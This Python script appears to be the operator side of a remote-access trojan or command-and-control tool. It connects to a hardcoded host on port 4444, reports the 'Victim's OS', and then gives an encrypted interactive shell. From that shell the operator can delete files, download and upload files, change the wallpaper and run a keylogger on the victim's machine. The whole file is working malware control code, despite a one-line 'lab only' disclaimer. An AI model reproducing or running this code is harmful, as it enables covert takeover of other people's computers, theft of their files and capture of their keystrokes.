import socket
import os
import time
from cryptography.fernet import Fernet




def Encrypt(data):
    return cipher.encrypt(data)

def Decrypt(data):
    return cipher.decrypt(data)

def to_1024(data):
    chunk_size = 1024
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    return chunks
print("""
 ██████╗██████╗       ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝╚════██╗      ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║      █████╔╝█████╗███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║     ██╔═══╝ ╚════╝╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
╚██████╗███████╗      ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
 ╚═════╝╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                                                       


""")
conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

conn.connect(('192.168.50.232',4444))

key = conn.recv(1024)
cipher = Fernet(key)

operating_system = conn.recv(1024)
print(f"Victim's OS => {operating_system.decode()}")

print(Decrypt(conn.recv(1024)).decode(), end="")
conn.send(Encrypt(input().encode()))
print(Decrypt(conn.recv(1024)).decode(), end="")
conn.send(Encrypt(input().encode()))

response = Decrypt(conn.recv(1024)).decode()
print(response)
if "failed" in response:
    conn.close()
    exit()



while 1:
    try:
        payload = input("shell> ")
        if payload == "help":
            print("""
***This tool is for learning and lab environment only***
Commands:
                dir -> shows the current directory info
                path -> shows the current path
                ipconfig -> shows network intrfaces information
                arp -a -> shows arp table
                del [file name] -> deletes a file on victims machine
                cd [path] -> changes the directory
                download [file name] -> downloads a file from victim's machine
                upload [file name] -> uploads a file to victim's machine
                wall [file name] -> change victim's wallpaper
                keylogger [characters to log(number)] [buffer size] -> logs the keys
""")
        elif "del" in payload:
            conn.sendall(Encrypt(payload.encode()))
            result = Decrypt(conn.recv(1024))
            print(result.decode())
        elif "keylogger" in payload:
            conn.sendall(Encrypt(payload.encode()))
            while 1:
                result = Decrypt(conn.recv(1024))
                if result.decode() != "Done":
                    print(result.decode().strip())
                else:
                    break
        elif "upload" in payload:
            conn.sendall(Encrypt(payload.encode()))
            file_name = payload.split(" ")[1]
            path = os.path.abspath(os.getcwd())
            try:
                with open(f"{path}/{file_name}","rb") as file:
                    content = file.read()
                    file.close()
                content = Encrypt(content)
                chunks = to_1024(content)
                conn.send(Encrypt(str(len(chunks)).encode()))
                time.sleep(1)
                for chunk in chunks:
                    conn.sendall(chunk)
            except:
                conn.send(Encrypt(b'Wrong file name'))
            print(Decrypt(conn.recv(1024)).decode())
        else:
            conn.sendall(Encrypt(payload.encode()))
            len_chunks = Decrypt(conn.recv(1024)).decode()
            print(f"Chunks coming: {len_chunks}")
            full_encrypted_data = b''
            for i in range(int(len_chunks)):
                chunk =conn.recv(1024)
                full_encrypted_data += chunk
            if "download" in payload:
                file_name = payload.split(" ")
                with open(f"./{file_name[1]}","ab") as file:
                    file.write(Decrypt(full_encrypted_data))
                    file.close()
                    print("Done")

            try:
                if "download" not in payload:
                    decrypted_data = Decrypt(full_encrypted_data).decode()
                    print(decrypted_data)
                else:
                    pass
            except Exception as e:
                print(f"Error decrypting data: {e}")
    except KeyboardInterrupt:
        print("\nClosing connection")
        conn.sendall(Encrypt(b'close'))
        break

conn.close()

